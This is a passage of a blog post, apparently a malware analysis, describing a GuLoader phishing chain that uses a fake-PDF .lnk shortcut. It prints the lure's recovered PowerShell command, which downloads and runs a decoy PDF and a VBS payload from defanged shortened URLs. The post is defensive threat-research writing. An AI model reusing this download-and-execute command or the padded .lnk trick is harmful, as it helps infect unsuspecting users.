placeholder="Search" value=""/></div></div></div><div class="h k w fg fh"><div class="fi ab"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerWriteButton" href="https://medium.com/m/signin?operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2Fnew-story&amp;source=---top_nav_layout_nav-----------------------new_post_topnav-----------" rel="noopener follow"><div class="bf b bg z du fj fk ab q fl fm"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24" aria-label="Write"><path fill="currentColor" d="M14 4a.5.5 0 0 0 0-1zm7 6a.5.5 0 0 0-1 0zm-7-7H4v1h10zM3 4v16h1V4zm1 17h16v-1H4zm17-1V10h-1v10zm-1 1a1 1 0 0 0 1-1h-1zM3 20a1 1 0 0 0 1 1v-1zM4 3a1 1 0 0 0-1 1h1z"></path><path stroke="currentColor" d="m17.5 4.5-8.458 8.458a.25.25 0 0 0-.06.098l-.824 2.47a.25.25 0 0 0 .316.316l2.47-.823a.25.25 0 0 0 .098-.06L19.5 6.5m-2-2 2.323-2.323a.25.25 0 0 1 .354 0l1.646 1.646a.25.25 0 0 1 0 .354L19.5 6.5m-2-2 2 2"></path></svg><div class="dt l">Write</div></div></a></span></div></div><div class="k j i d"><div class="fi ab"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSearchButton" href="https://medium.com/search?source=---top_nav_layout_nav----------------------------------" rel="noopener follow"><div class="bf b bg z du fj fk ab q fl fm"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24" aria-label="Search"><path fill="currentColor" fill-rule="evenodd" d="M4.092 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0m6.95-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .79-.79l-3.73-3.73A8.05 8.05 0 0 0 11.042 3z" clip-rule="evenodd"></path></svg></div></a></div></div><div class="fi h k j"><div class="ab q"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><button class="bf b dx dy eh dz ea ei eb ec ej ek ee el em eg eo ep eq er es et eu ev ew ex ey ez fa fb fc fd bm fe ff" data-testid="headerSignUpButton">Sign up</button></span></p><div class="ax l"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSignInButton" href="https://medium.com/m/signin?operation=login&amp;redirect=https%3A%2F%2Fgi7w0rm.medium.com%2Fcloudeye-from-lnk-to-shellcode-4b5f1d6d877&amp;source=post_page---top_nav_layout_nav-----------------------global_nav-----------" rel="noopener follow">Sign in</a></span></p></div></div></div><div class="l" aria-hidden="false"><button class="ay fn am ab q ao fo fp fq" aria-label="user options menu" data-testid="headerUserIcon"><div class="l fj"><img alt="" class="l fd by bz ca cx" src="https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png" width="32" height="32" loading="lazy" role="presentation"/><div class="fr by l bz ca fs n ay ft"></div></div></button></div></div></div><div class="l"><div class="fu fv fw fx fy l"><div class="ab cb"><div class="ci bh fz ga gb gc"></div></div><article><div class="l"><div class="l"><span class="l"></span><section><div><div class="fs gi gj gk gl gm"></div><div class="gn go gp gq gr"><div class="ab cb"><div class="ci bh fz ga gb gc"><div><h1 id="d6e1" class="pw-post-title gs gt gu bf gv gw gx gy gz ha hb hc hd he hf hg hh hi hj hk hl hm hn ho hp hq hr hs ht hu bk" data-testid="storyTitle">CloudEyE — From .lnk to Shellcode</h1><div><div class="speechify-ignore ab cp"><div class="speechify-ignore bh l"><div class="hv hw hx hy hz ab"><div><div class="ab ia"><div><div class="bm" aria-hidden="false"><a rel="noopener follow" href="/?source=post_page---byline--4b5f1d6d877--------------------------------"><div class="l ib ic by id ie"><div class="l fj"><img alt="Gi7w0rm" class="l fd by dd de cx" src="https://miro.medium.com/v2/resize:fill:88:88/1*XNZYIunppMSwHbb0Dxx3cA.png" width="44" height="44" loading="lazy" data-testid="authorPhoto"/><div class="if by l dd de fs n ig ft"></div></div></div></a></div></div></div></div><div class="bn bh l"><div class="ab"><div style="flex:1"><span class="bf b bg z bk"><div class="ih ab q"><div class="ab q ii"><div class="ab q"><div><div class="bm" aria-hidden="false"><p class="bf b ij ik bk"><a class="af ag ah ai aj ak al am an ao ap aq ar il" data-testid="authorName" rel="noopener follow" href="/?source=post_page---byline--4b5f1d6d877--------------------------------">Gi7w0rm</a></p></div></div></div><span class="im in" aria-hidden="true"><span class="bf b bg z du">·</span></span><p class="bf b ij ik du"><span><a class="io ip ah ai aj ak al am an ao ap aq ar ex iq ir" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2Ffa7639fc99f0&amp;operation=register&amp;redirect=https%3A%2F%2Fgi7w0rm.medium.com%2Fcloudeye-from-lnk-to-shellcode-4b5f1d6d877&amp;user=Gi7w0rm&amp;userId=fa7639fc99f0&amp;source=post_page-fa7639fc99f0--byline--4b5f1d6d877---------------------post_header-----------" rel="noopener follow">Follow</a></span></p></div></div></span></div></div><div class="l is"><span class="bf b bg z du"><div class="ab cn it iu iv"><span class="bf b bg z du"><div class="ab ae"><span data-testid="storyReadTime">12 min read</span><div class="iw ix l" aria-hidden="true"><span class="l" aria-hidden="true"><span class="bf b bg z du">·</span></span></div><span data-testid="storyPublishDate">Jul 9, 2023</span></div></span></div></span></div></div></div><div class="ab cp iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn"><div class="h k w fg fh q"><div class="kd l"><div class="ab q ke kf"><div class="pw-multi-vote-icon fj kg kh ki kj"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerClapButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F4b5f1d6d877&amp;operation=register&amp;redirect=https%3A%2F%2Fgi7w0rm.medium.com%2Fcloudeye-from-lnk-to-shellcode-4b5f1d6d877&amp;user=Gi7w0rm&amp;userId=fa7639fc99f0&amp;source=---header_actions--4b5f1d6d877---------------------clap_footer-----------" rel="noopener follow"><div><div class="bm" aria-hidden="false"><div class="kk ao kl km kn ko am kp kq kr kj"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l ks kt ku kv kw kx ky"><p class="bf b dv z du"><span class="kz">--</span></p></div></div></div><div><div class="bm" aria-hidden="false"><button class="ao kk lc ld ab q fk le lf" aria-label="responses"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="lb"><path d="M18.006 16.803c1.533-1.456 2.234-3.325 2.234-5.321C20.24 7.357 16.709 4 12.191 4S4 7.357 4 11.482c0 4.126 3.674 7.482 8.191 7.482.817 0 1.622-.111 2.393-.327.231.2.48.391.744.559 1.06.693 2.203 1.044 3.399 1.044.224-.008.4-.112.486-.287a.49.49 0 0 0-.042-.518c-.495-.67-.845-1.364-1.04-2.057a4 4 0 0 1-.125-.598zm-3.122 1.055-.067-.223-.315.096a8 8 0 0 1-2.311.338c-4.023 0-7.292-2.955-7.292-6.587 0-3.633 3.269-6.588 7.292-6.588 4.014 0 7.112 2.958 7.112 6.593 0 1.794-.608 3.469-2.027 4.72l-.195.168v.255c0 .056 0 .151.016.295.025.231.081.478.154.733.154.558.398 1.117.722 1.659a5.3 5.3 0 0 1-2.165-.845c-.276-.176-.714-.383-.941-.59z"></path></svg><p class="bf b dv z du"><span class="pw-responses-count la lb">1</span></p></button></div></div></div><div class="ab q jo jp jq jr js jt ju jv jw jx jy jz ka kb kc"><div class="lg k j i d"></div><div class="h k"><div><div class="bm" aria-hidden="false"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerBookmarkButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2F4b5f1d6d877&amp;operation=register&amp;redirect=https%3A%2F%2Fgi7w0rm.medium.com%2Fcloudeye-from-lnk-to-shellcode-4b5f1d6d877&amp;source=---header_actions--4b5f1d6d877---------------------bookmark_footer-----------" rel="noopener follow"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="du lh" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></a></span></div></div></div><div class="fd li cn"><div class="l ae"><div class="ab cb"><div class="lj lk ll lm ln lo ci bh"><div class="ab"><div class="bm bh" aria-hidden="false"><div><div class="bm" aria-hidden="false"><button aria-label="Listen" data-testid="audioPlayButton" class="af fk ah ai aj ak al lp an ao ap ex lq lr lf ls lt lu lv lw s lx ly lz ma mb mc md u me mf mg"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M3 12a9 9 0 1 1 18 0 9 9 0 0 1-18 0m9-10C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2m3.376 10.416-4.599 3.066a.5.5 0 0 1-.777-.416V8.934a.5.5 0 0 1 .777-.416l4.599 3.066a.5.5 0 0 1 0 .832" clip-rule="evenodd"></path></svg><div class="j i d"><p class="bf b bg z du">Listen</p></div></button></div></div></div></div></div></div></div></div><div class="bm" aria-hidden="false" aria-describedby="postFooterSocialMenu" aria-labelledby="postFooterSocialMenu"><div><div class="bm" aria-hidden="false"><button aria-controls="postFooterSocialMenu" aria-expanded="false" aria-label="Share Post" data-testid="headerSocialShareButton" class="af fk ah ai aj ak al lp an ao ap ex lq lr lf ls lt lu lv lw s lx ly lz ma mb mc md u me mf mg"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M15.218 4.931a.4.4 0 0 1-.118.132l.012.006a.45.45 0 0 1-.292.074.5.5 0 0 1-.3-.13l-2.02-2.02v7.07c0 .28-.23.5-.5.5s-.5-.22-.5-.5v-7.04l-2 2a.45.45 0 0 1-.57.04h-.02a.4.4 0 0 1-.16-.3.4.4 0 0 1 .1-.32l2.8-2.8a.5.5 0 0 1 .7 0l2.8 2.79a.42.42 0 0 1 .068.498m-.106.138.008.004v-.01zM16 7.063h1.5a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2h-11c-1.1 0-2-.9-2-2v-10a2 2 0 0 1 2-2H8a.5.5 0 0 1 .35.15.5.5 0 0 1 .15.35.5.5 0 0 1-.15.35.5.5 0 0 1-.35.15H6.4c-.5 0-.9.4-.9.9v10.2a.9.9 0 0 0 .9.9h11.2c.5 0 .9-.4.9-.9v-10.2c0-.5-.4-.9-.9-.9H16a.5.5 0 0 1 0-1" clip-rule="evenodd"></path></svg><div class="j i d"><p class="bf b bg z du">Share</p></div></button></div></div></div></div></div></div></div></div></div><p id="10d9" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">Hello and welcome back to another blog post. Today, we will look at the infection chain of a well-known malware loader called CloudEye (GuLoader). In recent years, this shellcode-based downloader has become a challenging piece of code to analyze. In fact, during conversations I had with several acknowledged reverse engineers, many of them pointed out that GuLoader is under active development to this day and that every time someone releases an analysis, its developers are fast to react and change the shellcode to a degree where all freshly developed tools for analyzing it are useless again. This sophistication is also why this post is not going to touch the ShellCode itself. It is rather going to give an overview of a current CloudEyE campaign, starting with a malicious link file that came via a download link from a phishing mail and ending with the retrieval of the GuLoader shellcode.</p><p id="3751" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">I highlighted the discussed part in this execution flow chart below:</p><figure class="ni nj nk nl nm nn nf ng paragraph-image"><div role="button" tabindex="0" class="no np fj nq bh nr"><div class="nf ng nh"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*iZAFaE20Ffz3o6zT65W6DQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*iZAFaE20Ffz3o6zT65W6DQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*iZAFaE20Ffz3o6zT65W6DQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*iZAFaE20Ffz3o6zT65W6DQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*iZAFaE20Ffz3o6zT65W6DQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*iZAFaE20Ffz3o6zT65W6DQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*iZAFaE20Ffz3o6zT65W6DQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*iZAFaE20Ffz3o6zT65W6DQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*iZAFaE20Ffz3o6zT65W6DQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*iZAFaE20Ffz3o6zT65W6DQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*iZAFaE20Ffz3o6zT65W6DQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*iZAFaE20Ffz3o6zT65W6DQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*iZAFaE20Ffz3o6zT65W6DQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*iZAFaE20Ffz3o6zT65W6DQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lo ns c" width="700" height="1333" loading="eager" role="presentation"/></picture></div></div><figcaption class="nt ff nu nf ng nv nw bf b bg z du">Figure 1: Attack Flow of this GuLoader campaign</figcaption></figure><p id="214d" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">For more information on this campaign, please refer to Section:<em class="nx"> Additional Findings (part 2)</em>.</p></div></div></div><div class="ab cb ny nz oa ob" role="separator"><span class="oc by bm od oe of"></span><span class="oc by bm od oe of"></span><span class="oc by bm od oe"></span></div><div class="gn go gp gq gr"><div class="ab cb"><div class="ci bh fz ga gb gc"><h2 id="cc20" class="og oh gu bf oi oj ok dy ol om on ea oo ms op oq or mw os ot ou na ov ow ox oy bk">Stage 1: A “fake” pdf</h2><p id="21d2" class="pw-post-body-paragraph mh mi gu mj b mk oz mm mn mo pa mq mr ms pb mu mv mw pc my mz na pd nc nd ne gn bk">For me, this investigation started as I was sifting through the results of a known online sandbox service called <a class="af pe" href="https://tria.ge/reports/public" rel="noopener ugc nofollow" target="_blank">Triage</a>. I sometimes do so to find uncommon malware that is currently not on my scope, trying to keep up with ongoing threat development together with the curiosity of discovering something unique. And while GuLoader is not a new threat, the <a class="af pe" href="https://tria.ge/230703-ep773sef43" rel="noopener ugc nofollow" target="_blank">sandbox results</a> for one of its campaigns somehow stuck with me. So I decided to give it another look.</p><p id="ca12" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">The file we see uploaded to Triage is named “RFQ No 41 26_06_2023.pdf.lnk” and has the SHA-256 Hash: “748c0ef7a63980d4e8064b14fb95ba51947bfc7d9ccf39c6ef614026a89c39e5”.</p><p id="00ab" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">The double-file ending should immediately set off your alarm bells. In Windows 10 and above, file endings are not rendered in File Explorer by default. Therefore, a double file ending means the original file-type ending is hidden, while the second last one (in this case .pdf) is shown. This is done to lure victims into thinking they are opening a file of the .pdf type, while they do something pretty different in opening a Windows Shortcut file. This Shortcut file in turn is then used to execute the attack. Let’s have a look at it:</p><figure class="ni nj nk nl nm nn nf ng paragraph-image"><div role="button" tabindex="0" class="no np fj nq bh nr"><div class="nf ng pf"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*XdjulL-B8f-MLUI6HIrWYQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*XdjulL-B8f-MLUI6HIrWYQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*XdjulL-B8f-MLUI6HIrWYQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*XdjulL-B8f-MLUI6HIrWYQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*XdjulL-B8f-MLUI6HIrWYQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*XdjulL-B8f-MLUI6HIrWYQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XdjulL-B8f-MLUI6HIrWYQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*XdjulL-B8f-MLUI6HIrWYQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*XdjulL-B8f-MLUI6HIrWYQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*XdjulL-B8f-MLUI6HIrWYQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*XdjulL-B8f-MLUI6HIrWYQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*XdjulL-B8f-MLUI6HIrWYQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*XdjulL-B8f-MLUI6HIrWYQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*XdjulL-B8f-MLUI6HIrWYQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lo ns c" width="700" height="469" loading="eager" role="presentation"/></picture></div></div><figcaption class="nt ff nu nf ng nv nw bf b bg z du">Figure 2: Shortcut properties view</figcaption></figure><p id="0087" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">As you can see, upon opening the link-files properties, we are greeted with a seemingly empty “Target” field. Normally, we would expect some sort of command here, used to infect the system. But even if we copy the full string from the target field, we only get:</p><pre class="ni nj nk nl nm pg ph pi bp pj bb bk"><span id="83ca" class="pk oh gu ph b bg pl pm l pn po">\\localhost\c$\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe</span></pre><p id="a2af" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">with many space chars appended to hide the command as seen in Figure 2.</p><p id="0f3f" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">Still, even the fact that the link file seems to open “powershell.exe” as a target is not dangerous in itself. Where is our attack?</p><p id="790f" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">Well, things start to change if we look at the .lnk file using a Hex-Editor:</p><figure class="ni nj nk nl nm nn nf ng paragraph-image"><div role="button" tabindex="0" class="no np fj nq bh nr"><div class="nf ng pp"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*SKC3IJPdjXNzfXYXp6RfUA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*SKC3IJPdjXNzfXYXp6RfUA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*SKC3IJPdjXNzfXYXp6RfUA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*SKC3IJPdjXNzfXYXp6RfUA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*SKC3IJPdjXNzfXYXp6RfUA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*SKC3IJPdjXNzfXYXp6RfUA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*SKC3IJPdjXNzfXYXp6RfUA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*SKC3IJPdjXNzfXYXp6RfUA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*SKC3IJPdjXNzfXYXp6RfUA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*SKC3IJPdjXNzfXYXp6RfUA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*SKC3IJPdjXNzfXYXp6RfUA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*SKC3IJPdjXNzfXYXp6RfUA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*SKC3IJPdjXNzfXYXp6RfUA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*SKC3IJPdjXNzfXYXp6RfUA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lo ns c" width="700" height="739" loading="lazy" role="presentation"/></picture></div></div><figcaption class="nt ff nu nf ng nv nw bf b bg z du">Figure 3: .lnk file in Hex-Editor</figcaption></figure><p id="ecee" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">As you can see, there is a lot more going on here than was visible at first sight. The full command executed by the .lnk file is actually not only “powershell.exe”, but:</p><pre class="ni nj nk nl nm pg ph pi bp pj bb bk"><span id="6911" class="pk oh gu ph b bg pl pm l pn po">\\localhost\c$\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe Invoke-WebRequest hxxps://shorturl[.]at/iwAK9 -O C:\Users\Public\RFQ-INFO.pdf; C:\Users\Public\RFQ-INFO.pdf; Invoke-WebRequest hxxps://shorturl[.]at/guDHW -O C:\Windows\Tasks\Reilon.vbs; C:\Windows\Tasks\Reilon.vbs&lt;C:\Program Files (x86)\Microsoft\Edge\Appliation\msedge.exe</span></pre><p id="4448" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">Let us split this command up into 2 parts and discuss them individually:</p><pre class="ni nj nk nl nm pg ph pi bp pj bb bk"><span id="21e8" class="pk oh gu ph b bg pl pm l pn po">Invoke-WebRequest hxxps://shorturl[.]at/iwAK9 -O C:\Users\Public\RFQ-INFO.pdf; C:\Users\Public\RFQ-INFO.pdf;</span></pre><p id="d7bb" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">The first PowerShell command executed downloads a file via the shortened URL: hxxps://shorturl[.]at/iwAK9. <br/>This actually does a redirect to: hxxps://img.softmedal[.]com/uploads/2023-06-23/773918053744.jpg</p><p id="90a3" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">Pretending to be a .jpg image file, it is actually a legitimate .pdf file used as a decoy. The file is downloaded to the folder “C:\Users\Public\RFQ-INFO.pdf” and consequently opened via a direct Powershell call.</p><p id="036c" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">From the users&#x27; point of view, it will appear everything is normal. They will look at the following file once executing the .lnk.pdf:</p><figure class="ni nj nk nl nm nn nf ng paragraph-image"><div role="button" tabindex="0" class="no np fj nq bh nr"><div class="nf ng pq"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*M1kSxhLk9LpFS1rRAkN1sw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*M1kSxhLk9LpFS1rRAkN1sw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*M1kSxhLk9LpFS1rRAkN1sw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*M1kSxhLk9LpFS1rRAkN1sw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*M1kSxhLk9LpFS1rRAkN1sw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*M1kSxhLk9LpFS1rRAkN1sw.png 